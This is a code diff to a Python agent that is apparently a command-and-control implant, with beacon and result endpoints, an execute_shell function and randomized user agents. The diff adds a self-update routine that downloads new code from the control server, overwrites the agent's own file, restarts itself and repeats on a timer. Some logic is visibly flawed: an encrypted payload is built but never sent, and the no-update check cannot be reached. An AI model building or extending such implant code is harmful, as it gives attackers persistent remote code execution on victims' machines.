@@ -14,8 +14,8 @@ import importlib.util
 from multiprocessing import Process
 from datetime import datetime ,timezone
 from pathlib import Path
-
-
+import shutil
+import threading
 SERVER_URL = "https://127.0.0.1"
 BEACON_ENDPOINT = "/beacon"
 RESULT_ENDPOINT = "/result"
@@ -216,6 +216,47 @@ def execute_task(task, task_uuid):
         post_result(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds",task_uuid,executed_at)
 
 
+def agent_update_periodic(seconds=60):
+    def agent_update():
+        AGENT_FILE = os.path.abspath(__file__)
+        UPDATE_URL = SERVER_URL + "/agent_update"
+        AGENT_VERSION = "1.0.2"
+
+        try:
+            print("Checking for update...")
+
+            headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
+            payload = {"version": AGENT_VERSION, "id": AGENT_ID}
+            encrypted_payload = encrypt_data(json.dumps(payload))
+
+            response = session.post(UPDATE_URL, headers=headers, json=payload)
+            response.raise_for_status()
+
+            if response.status_code == 400:
+                print("No update available.")
+            else:
+                tmp_file = AGENT_FILE + ".tmp"
+                with open(tmp_file, "wb") as f:
+                    f.write(response.content)
+
+                backup_file = AGENT_FILE + ".bak"
+                shutil.move(AGENT_FILE, backup_file)
+                shutil.move(tmp_file, AGENT_FILE)
+
+                print("Update applied! Restarting...")
+                os.execv(sys.executable, [sys.executable] + sys.argv)
+
+        except Exception as e:
+            print("Update failed:", e)
+
+        # Reschedule the next run
+        threading.Timer(seconds, agent_update).start()
+
+    # Initial call
+    agent_update()
+
+
+
 def execute_shell(command, task_uuid):
 
     try:
@@ -388,6 +429,7 @@ def main():
     while attempts < 5:
         if login():
             print("[+] Agent authenticated")
+            #agent_update_periodic()
             break
         else:
             attempts += 1
